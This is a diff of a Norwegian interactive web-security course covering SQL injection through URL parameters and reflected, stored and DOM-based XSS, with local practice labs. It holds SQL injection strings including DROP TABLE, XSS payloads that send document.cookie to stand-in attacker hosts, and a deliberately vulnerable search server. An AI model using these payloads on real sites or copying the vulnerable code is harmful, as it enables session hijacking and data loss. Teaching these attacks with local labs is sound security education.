-      <div class="theory-block"><div class="theory-title">🔗 URL-parametre som angrepspunkt</div><div class="theory-text"><p>Ikke bare inputfelt er sårbare — URL-parametre kan gå direkte til databasen. Angriperen redigerer bare URL-en.</p></div></div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Endre ?id= og se at profilen endres</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Injiser <code>1 OR 1=1</code></div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Prøv <code>1; DROP TABLE users --</code></div></div>
-      </div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">sosialmed.no/profil?id=<span id="url-disp">1</span></div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#4c1d95"><span class="ts-logo">👤 SosialMed</span></div><div class="ts-body">
-          <div style="display:flex;gap:8px;margin-bottom:12px;align-items:center"><span style="font-size:12px;color:#888">?id=</span><input class="ts-input" id="url-p" value="1" style="max-width:200px" oninput="urlPU()"><button class="ts-btn" style="background:#4c1d95;font-size:12px" onclick="urlPS()">Hent</button></div>
-          <div id="url-res"></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">06</span>
+  <span class="lab-title">SQL Injection — via URL-parameter</span>
+  <div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-3">Nivå 6 — URL-parameter injection</div>
+<p class="e-hook">Ingen skjema? Ikke noe problem 🙃 Adressefeltet er også et inputfelt.</p>
+
+<div class="e-spill" data-spill="lyn" data-tittel="⚡ Trygg eller farlig?" data-knapper="😇 Trygg|🦹 Farlig">
+  <div class="ly-fast">Siden kjører <code>SELECT name, email FROM users WHERE id=</code><b>[det etter id=]</b></div>
+  <div class="ly-item" data-svar="0" data-hvorfor="Bare et tall. Akkurat det siden venter.">profil.php?id=2</div>
+  <div class="ly-item" data-svar="1" data-hvorfor="OR 1=1 er alltid sant. Alle profilene kommer ut.">profil.php?id=1 OR 1=1</div>
+  <div class="ly-item" data-svar="0" data-hvorfor="Finnes kanskje ikke, men ufarlig. Siden svarer «ingen bruker».">profil.php?id=42</div>
+  <div class="ly-item" data-svar="1" data-hvorfor="; starter en ny SQL-setning, og DROP TABLE sletter hele tabellen 💥">profil.php?id=1; DROP TABLE users --</div>
+  <div class="ly-item" data-svar="1" data-hvorfor="%20 er et mellomrom i URL-språk. Dette er 1 OR 1=1 i forkledning 🥸">profil.php?id=1%20OR%201=1</div>
+  <div class="ly-item" data-svar="0" data-hvorfor="Et vanlig tall igjen.">profil.php?id=3</div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+Alt etter <code>?</code> i adressen er <b>URL-parametre</b>, skrevet <code>navn=verdi</code>. Angriperen trenger ikke noe skjema, bare adressefeltet.<br>
+Mellomrom skrives <code>%20</code> i en adresse. Det heter <b>URL-koding</b>.<br>
+<code>DROP TABLE</code> sletter en hel tabell.
+</div>
+<p class="e-sikker">🧱 Mange nettsider lar bare én SQL-setning kjøre om gangen, så <code>; DROP TABLE</code> virker ikke alltid. Men <code>OR 1=1</code> trenger bare én setning.</p>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="sqlite3 sosial.db &quot;SELECT name, email FROM users WHERE id=2;&quot;" data-mal="Hent profil 2, som siden gjør med <code>?id=2</code>:"><template class="ut">Kari Hansen|kari@example.no</template><template class="forklar"><p>Én profil. Akkurat som det skal være.</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 sosial.db &quot;SELECT name, email FROM users WHERE id=1 OR 1=1;&quot;" data-mal="Nå med <code>?id=1 OR 1=1</code>:"><template class="ut"><span class="h1">Ola Nordmann|ola@example.no
+Kari Hansen|kari@example.no
+Lars Elvestad|lars@example.no</span></template><template class="forklar"><p>Alle profilene. Legg merke til at angriperen ikke trengte noen <code>'</code>: id er et tall, så det står ingen fnutter rundt.</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 sosial.db &quot;SELECT name FROM users WHERE id=1; DROP TABLE users; --&quot;" data-mal="Og <code>?id=1; DROP TABLE users --</code>:"><template class="ut">Ola Nordmann</template><template class="forklar"><p>Ser uskyldig ut! Men sqlite3 kjørte to setninger. Den andre sa ikke noe… 🤫</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 sosial.db .tables" data-alias="sqlite3 sosial.db &quot;.tables&quot;|sqlite3 sosial.db '.tables'" data-mal="Hvilke tabeller finnes nå?" data-skjult data-hint="<code>sqlite3 sosial.db</code> og så <code>.tables</code>, med punktum foran."><template class="ut"><span class="dim">(ingen linjer)</span></template><template class="forklar"><p>Tomt. Tabellen <code>users</code> er borte 💥 Det er tilgjengelighet som ryker.</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="3|tre"><span class="ans-q">Hvor mange profiler kom ut med <code>id=1 OR 1=1</code>?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tell de gule linjene i oppdrag 2.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">3</div></div></div>
+<div class="ans-row" data-p="1" data-a="ingen|ingenting|null|0|ingen tabeller|tomt"><span class="ans-q">Hvor mange tabeller fantes etter DROP?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Hvor mange linjer skrev <code>.tables</code> i oppdrag 4?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">0</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag databasen: skriv <code>sqlite3 sosial.db</code>, lim inn linja under, og avslutt med <code>.quit</code>. Kjør DROP-kommandoen bare på din egen testdatabase. Vil du prøve igjen etterpå, lager du den bare på nytt.
+<pre class="e-kode">CREATE TABLE users(id INTEGER, name TEXT, email TEXT); INSERT INTO users VALUES(1,'Ola Nordmann','ola@example.no'),(2,'Kari Hansen','kari@example.no'),(3,'Lars Elvestad','lars@example.no');</pre></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="drop table|DROP"><span class="ans-q">Hvilken SQL-kommando ville slettet hele brukertabellen?</span><input class="ans-in" placeholder="to ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Kommandoen fjerner hele tabellen, ikke bare rader.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">drop table</div></div></div>
-        </div>
-
-      <div><button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button><div class="sol-box"><code>DROP TABLE</code> ville slettet hele brukertabellen permanent.</div></div>
-      <div class="complete-banner" id="done-web-6"><span>✓</span> Lab 6 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">To ord fra oppdrag 3 i terminalen, rett før <code>users</code>.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">drop table</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 7 · REFLECTED XSS ═══════════════════════ -->
 <div class="lab-card" id="web-7" data-level="hard">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">07</span><span class="lab-title">XSS — Reflected</span><div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-4">Nivå 7 — Reflected XSS</div>
-      <div class="theory-block"><div class="theory-title">🪞 Hva er XSS?</div><div class="theory-text"><p>XSS er injection av JavaScript i en nettside. I stedet for databasen, angripes nettleseren til andre brukere. Reflected XSS: payloaden reflekteres tilbake fra URL-en.</p></div></div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Søk normalt — se at søkeordet reflekteres</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Søk med <code>&lt;b&gt;fett&lt;/b&gt;</code></div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Injiser <code>&lt;img src=x onerror="document.getElementById('xss-c').style.display='block'"&gt;</code></div></div>
-      </div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">nettavis.no/sok?q=<span id="xss-url"></span></div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#b91c1c"><span class="ts-logo">📰 Nettavis</span></div><div class="ts-body">
-          <div style="display:flex;gap:8px;margin-bottom:10px"><input class="ts-input" id="xss-in" placeholder="Søk..."><button class="ts-btn" style="background:#b91c1c" onclick="xssR()">Søk</button></div>
-          <div class="ts-result" id="xss-res" style="min-height:40px">—</div>
-          <div id="xss-c" style="display:none;margin-top:10px;background:#fef2f2;border:1px solid #fca5a5;border-radius:6px;padding:10px;font-family:monospace;font-size:12px;color:#991b1b">⚠ Cookie-leak: sessionId=a3f9b2c1; user=lars.elvestad</div>
-          <div id="xss-st" class="lab-status" style="margin-top:8px"><div class="pulse r"></div><span></span></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">07</span>
+  <span class="lab-title">XSS — Reflected</span>
+  <div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-4">Nivå 7 — Reflected XSS</div>
+<p class="e-hook">Én lenke. Ett klikk. Og noen andre er logget inn som deg 🍪</p>
+
+<div class="e-spill" data-spill="chat" data-tittel="💬 Lenken til Lars">
+  <div class="ch-item" data-fra="sys">📰 Søket i nettavisa skriver søkeordet rett tilbake på siden: «Du søkte etter: <b>sykkel</b>»</div>
+  <div class="ch-item" data-fra="ond" data-navn="🦹 Angriper">Hva om søkeordet er HTML? Jeg prøver <code>&lt;b&gt;fett&lt;/b&gt;</code>…</div>
+  <div class="ch-item" data-fra="sys">Ordet vises i <b>fet</b> skrift. Siden tolket HTML-en 😮</div>
+  <div class="ch-item" data-fra="ond" data-navn="🦹 Angriper">Da legger jeg JavaScript i søkeordet, og sender lenken til Lars 😈<br><code>/sok?q=&lt;img src=x onerror="fetch('//ond.example/?c='+document.cookie)"&gt;</code></div>
+  <div class="ch-item" data-fra="ond" data-navn="🦹 Angriper">Hei Lars! Se hva avisa skriver om deg 😮 [lenke]</div>
+  <div class="ch-item" data-stopp="👆 Lars klikker…"></div>
+  <div class="ch-item" data-fra="pc" data-navn="🌐 Nettleseren til Lars">Serveren sendte meg et bilde med adresse x. Det finnes ikke… Da kjører jeg <code>onerror</code>, som jeg fikk beskjed om.</div>
+  <div class="ch-item" data-fra="sys">⚠️ Sendt til ond.example: <code>sessionId=a3f9b2c1</code></div>
+  <div class="ch-item" data-fra="ond" data-navn="🦹 Angriper">Takk, Lars. Med den cookien er jeg innlogget som deg 😏</div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>XSS</b> (cross-site scripting): JavaScript som sniker seg inn i en side og kjører i nettleseren til offeret.<br>
+<b>Reflected XSS</b>: payloaden ligger i lenken, og serveren speiler den tilbake med en gang. Offeret må klikke.<br>
+<code>onerror</code> kjører når et bilde ikke kan lastes. En <b>cookie</b> er lappen som holder deg innlogget.
+</div>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="cat sok.py" data-mal="Se koden til søkesiden:"><template class="ut">from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs
+
+class Sok(BaseHTTPRequestHandler):
+    def do_GET(self):
+        q = parse_qs(urlparse(self.path).query).get("q", [""])[0]
+        <span class="h1">side = "&lt;p&gt;Du søkte etter: &lt;b&gt;" + q + "&lt;/b&gt;&lt;/p&gt;"</span>
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header(<span class="h2">"Set-Cookie", "sessionId=a3f9b2c1"</span>)
+        self.end_headers()
+        self.wfile.write(side.encode())
+
+HTTPServer(("127.0.0.1", 8000), Sok).serve_forever()</template><template class="forklar"><ul class="e-forklar"><li><span class="m h1"></span><span>søkeordet <code>q</code> limes rett inn i HTML-en. Her er feilen!</span></li><li><span class="m h2"></span><span>serveren gir deg en cookie</span></li></ul><p>Serveren kjører allerede i en annen fane (<code>python3 sok.py</code>). Den sier ingenting, den bare venter.</p></template></div>
+<div class="tm-o" data-cmd="curl -i &quot;http://localhost:8000/sok?q=sykkel&quot;" data-alias="curl -i 'http://localhost:8000/sok?q=sykkel'|curl -i &quot;localhost:8000/sok?q=sykkel&quot;" data-mal="Søk etter sykkel, og se svaret med headere:"><template class="ut">HTTP/1.0 <span class="h3">200 OK</span>
+Server: BaseHTTP/0.6 Python/3.13.16
+Date: Wed, 07 Oct 2026 18:30:16 GMT
+Content-Type: text/html; charset=utf-8
+<span class="h2">Set-Cookie: sessionId=a3f9b2c1</span>
+
+&lt;p&gt;Du søkte etter: &lt;b&gt;<span class="h1">sykkel</span>&lt;/b&gt;&lt;/p&gt;</template><template class="forklar"><ul class="e-forklar"><li><span class="m h3"></span><span>statuskode: 200 = alt i orden</span></li><li><span class="m h2"></span><span>cookien nettleseren skal huske</span></li><li><span class="m h1"></span><span>søkeordet ditt, speilet tilbake</span></li></ul><p><code>-i</code> = vis headerne også, ikke bare siden.</p></template></div>
+<div class="tm-o" data-cmd="curl -s &quot;http://localhost:8000/sok?q=&lt;b&gt;fett&lt;/b&gt;&quot;" data-alias="curl -s 'http://localhost:8000/sok?q=&lt;b&gt;fett&lt;/b&gt;'|curl -s &quot;localhost:8000/sok?q=&lt;b&gt;fett&lt;/b&gt;&quot;" data-mal="Søk etter <code>&lt;b&gt;fett&lt;/b&gt;</code>, uten headere." data-skjult data-hint="Som oppdrag 2, men med <code>-s</code> i stedet for <code>-i</code>, og <code>&lt;b&gt;fett&lt;/b&gt;</code> i stedet for sykkel."><template class="ut">&lt;p&gt;Du søkte etter: &lt;b&gt;<span class="h1">&lt;b&gt;fett&lt;/b&gt;</span>&lt;/b&gt;&lt;/p&gt;</template><template class="forklar"><p>HTML-en din kom tilbake uendret. En nettleser ville tolket den.</p></template></div>
+<div class="tm-o" data-cmd="curl -s &quot;http://localhost:8000/sok?q=&lt;img%20src=x%20onerror=alert(1)&gt;&quot;" data-alias="curl -s 'http://localhost:8000/sok?q=&lt;img%20src=x%20onerror=alert(1)&gt;'|curl -s &quot;localhost:8000/sok?q=&lt;img%20src=x%20onerror=alert(1)&gt;&quot;" data-mal="Nå med ekte XSS-payload. <code>%20</code> er mellomrom, husker du?"><template class="ut">&lt;p&gt;Du søkte etter: &lt;b&gt;<span class="h1">&lt;img src=x <span class="h4">onerror</span>=alert(1)&gt;</span>&lt;/b&gt;&lt;/p&gt;</template><template class="forklar"><ul class="e-forklar"><li><span class="m h1"></span><span>et ekte bilde-element i siden</span></li><li><span class="m h4"></span><span>JavaScript som kjører når bildet x ikke finnes</span></li></ul><p>Åpner du lenken i Firefox, spretter en boks med «1» opp 💥 Fiksen er å gjøre <code>&lt;</code> om til <code>&amp;lt;</code> før søkeordet settes inn.</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="sessionId|session id"><span class="ans-q">Hva heter cookien serveren satte? (navnet før =)</span><input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den blå linja som starter med <code>Set-Cookie</code> i oppdrag 2.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">sessionId</div></div></div>
+<div class="ans-row" data-p="1" data-a="200"><span class="ans-q">Hvilken statuskode fikk søket etter sykkel?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tallet på første linje i oppdrag 2.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">200</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag <code>nano sok.py</code> med koden fra oppdrag 1. Start den med <code>python3 sok.py</code>, og kjør <code>curl</code> i en ny fane (<b>Ctrl + Shift + T</b>). Lim så den siste adressen inn i Firefox og se boksen sprette opp. Stopp serveren med <b>Ctrl + C</b>. Testsiden lytter bare på 127.0.0.1, så ingen andre når den.<p class="e-win">Windows: <code>python sok.py</code> og <code>curl.exe -i "http://localhost:8000/sok?q=sykkel"</code></p></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="onerror"><span class="ans-q">Hvilket attributt i img-taggen kjører JavaScript?</span><input class="ans-in" placeholder="attributt"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Det utl&oslash;ses n&aring;r bildet ikke kan lastes.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">onerror</div></div></div>
-        </div>
-
-      <div><button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button><div class="sol-box">En angriper bruker: <code>onerror="fetch('evil.com?c='+document.cookie)"</code> — session hijacking.</div></div>
-      <div class="complete-banner" id="done-web-7"><span>✓</span> Lab 7 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Ordet som starter med <code>on</code> i payloaden i oppdrag 4.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">onerror</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 8 · STORED XSS ═══════════════════════ -->
 <div class="lab-card" id="web-8" data-level="hard">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">08</span><span class="lab-title">XSS — Stored (lagret injeksjon)</span><div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-4">Nivå 8 — Stored XSS</div>
-      <div class="theory-block"><div class="theory-title">💾 Stored vs Reflected</div><div class="theory-text"><p>Stored XSS lagrer payloaden i databasen og kjører den for alle som besøker siden. Mye farligere enn reflected XSS.</p></div></div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Legg igjen en normal kommentar</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Legg igjen <code>&lt;img src=x onerror="this.closest('.ts-comment').style.border='3px solid red'"&gt;</code></div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Klikk "Simuler ny besøkende" — kjøres payloaden automatisk?</div></div>
-      </div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">forum.no/thread/42</div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#1e3a5f"><span class="ts-logo">💬 Forum</span></div><div class="ts-body">
-          <div id="stor-comments"><div class="ts-comment"><div class="ts-comment-author">alice</div><div class="ts-comment-text">Interessant tråd!</div></div></div>
-          <div style="display:flex;justify-content:space-between;align-items:center;margin:10px 0 6px"><span style="font-size:12px;color:#888">Kommentar <span class="ts-tag vuln-tag">innerHTML</span></span><button class="ts-btn" style="background:#6b7280;font-size:11px;padding:5px 10px" onclick="storSim()">Simuler besøkende</button></div>
-          <input class="ts-input" id="stor-name" placeholder="Navn" style="margin-bottom:6px">
-          <input class="ts-input" id="stor-text" placeholder="Kommentar..." style="margin-bottom:8px">
-          <button class="ts-btn" style="background:#1e3a5f" onclick="storPost()">Post</button>
-          <div id="stor-st" class="lab-status" style="margin-top:8px"><div class="pulse a"></div><span></span></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">08</span>
+  <span class="lab-title">XSS — Stored (lagret injeksjon)</span>
+  <div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-4">Nivå 8 — Stored XSS</div>
+<p class="e-hook">Hva om angriperen slipper å sende lenker? Hun legger fella i forumet, og venter 🪤</p>
+
+<div class="e-spill" data-spill="klikk" data-tittel="🔎 Finn fellene i forumet" data-oppgave="Slik sender serveren tråd 42 til alle som åpner den. Klikk på kommentarene som vil <b>kjøre kode</b> hos alle besøkende.">
+<pre>&lt;h2&gt;Tråd 42: Beste sykkelvei?&lt;/h2&gt;
+&lt;div&gt;&lt;b&gt;alice&lt;/b&gt; <span class="kl" data-forklar="Vanlig tekst. Ufarlig.">Interessant tråd!</span>&lt;/div&gt;
+&lt;div&gt;&lt;b&gt;mallory&lt;/b&gt; <span class="kl" data-rett data-forklar="Et ekte bilde-element med onerror. Kjører hos alle som åpner tråden.">&lt;img src=x onerror=alert(1)&gt;</span>&lt;/div&gt;
+&lt;div&gt;&lt;b&gt;bob&lt;/b&gt; <span class="kl" data-forklar="Lurt! &amp;lt; er den trygge måten å skrive &lt; på. Nettleseren viser teksten, men kjører ingenting. Det er escaping.">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span>&lt;/div&gt;
+&lt;div&gt;&lt;b&gt;eve&lt;/b&gt; <span class="kl" data-rett data-forklar="Et ekte script som sender cookien til alle besøkende ut av huset 🍪">&lt;script&gt;fetch('//ond.example/?c='+document.cookie)&lt;/script&gt;</span>&lt;/div&gt;
+&lt;div&gt;&lt;b&gt;kari&lt;/b&gt; <span class="kl" data-forklar="Et smilefjes og litt tekst. Helt trygt.">Enig med alice 👍</span>&lt;/div&gt;</pre>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>Stored XSS</b> (lagret XSS): payloaden lagres i databasen og sendes til <b>alle</b> som åpner siden. Ingen trenger å klikke en spesiell lenke.<br>
+<b>Escaping</b>: å skrive <code>&lt;</code> som <code>&amp;lt;</code>, så nettleseren viser tegnet i stedet for å tolke det. Det var derfor bob var ufarlig.
+</div>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="sqlite3 forum.db &quot;SELECT navn, tekst FROM kommentarer;&quot;" data-mal="Se kommentarene i forumdatabasen:"><template class="ut">alice|Interessant tråd!
+bob|Enig med alice 👍</template><template class="forklar"><p>To vanlige kommentarer.</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 forum.db &quot;INSERT INTO kommentarer(navn, tekst) VALUES('mallory', '&lt;img src=x onerror=alert(1)&gt;');&quot;" data-mal="Vær mallory 🦹 Lagre en kommentar med payload:"><template class="ut"><span class="dim">(ingen utskrift)</span></template><template class="forklar"><p>Ingen feilmelding. For databasen er payloaden bare tekst. Den lagres uten å blunke.</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 forum.db &quot;SELECT navn, tekst FROM kommentarer;&quot;" data-mal="Se kommentarene igjen." data-skjult data-hint="Samme kommando som i oppdrag 1."><template class="ut">alice|Interessant tråd!
+bob|Enig med alice 👍
+<span class="h1">mallory|&lt;img src=x onerror=alert(1)&gt;</span></template><template class="forklar"><p>Nå ligger fella der. Hver gang tråden vises, sendes den med 🪤</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 forum.db &quot;SELECT navn FROM kommentarer WHERE tekst LIKE '%onerror%';&quot;" data-mal="Vær forsvareren 🛡️ Let etter payloads i databasen:"><template class="ut"><span class="h2">mallory</span></template><template class="forklar"><p><code>LIKE '%onerror%'</code> = «teksten inneholder onerror». Sånn finner du lagrede feller.</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="mallory"><span class="ans-q">Hvem la inn den farlige kommentaren?</span><input class="ans-in" placeholder="et navn"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den blå linja i oppdrag 4.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">mallory</div></div></div>
+<div class="ans-row" data-p="1" data-a="3|tre"><span class="ans-q">Hvor mange kommentarer ligger i tabellen etter angrepet?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tell linjene i oppdrag 3.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">3</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag forumet: skriv <code>sqlite3 forum.db</code>, lim inn linja under, og avslutt med <code>.quit</code>. Så kan du kjøre de samme kommandoene.
+<pre class="e-kode">CREATE TABLE kommentarer(id INTEGER PRIMARY KEY, navn TEXT, tekst TEXT); INSERT INTO kommentarer(navn,tekst) VALUES('alice','Interessant tråd!'),('bob','Enig med alice 👍');</pre></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="lagret|stored"><span class="ans-q">Reflected eller stored — hvilken krever ikke at offeret klikker en lenke?</span><input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den ene ligger allerede p&aring; siden n&aring;r offeret kommer.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">stored</div></div></div>
-        </div>
-
-      <div><button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button><div class="sol-box">Stored er farligere: offeret trenger ikke klikke en spesiell lenke.</div></div>
-      <div class="complete-banner" id="done-web-8"><span>✓</span> Lab 8 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Måtte noen klikke på en lenke for å gå i mallorys felle? Les fagord-boksen.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">stored</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 9 · DOM XSS ═══════════════════════ -->
 <div class="lab-card" id="web-9" data-level="hard">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">09</span><span class="lab-title">XSS — DOM-basert</span><div class="lab-meta"><span class="badge badge-hard">Vanskelig</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-4">Nivå 9 — DOM XSS</div>
-      <div class="theory-block"><div class="theory-title">🌐 DOM XSS — serveren ser ingenting</div><div class="theory-text"><p>DOM XSS skjer helt i nettleseren. Payloaden leses av JavaScript — serveren ser den aldri.</p></div>
-        <div class="code-block"><span class="sql-com">// Sårbar kode:</span>
-el.innerHTML = 'Hei, ' + location.search.slice(6);</div>
-      </div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Skriv et navn — fungerer det?</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Injiser <code>&lt;img src=x onerror="alert('XSS')"&gt;</code></div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Fix: <code>innerHTML</code> vs <code>textContent</code></div></div>
-      </div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">app.no/velkommen?name=<span id="dom-url"></span></div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#065f46"><span class="ts-logo">👋 Velkomstside</span></div>
-          <div id="dom-hi" class="ts-hero" style="background:linear-gradient(135deg,#065f46,#022c22)"><div style="font-size:18px;font-weight:700;color:#fff">Hei!</div></div>
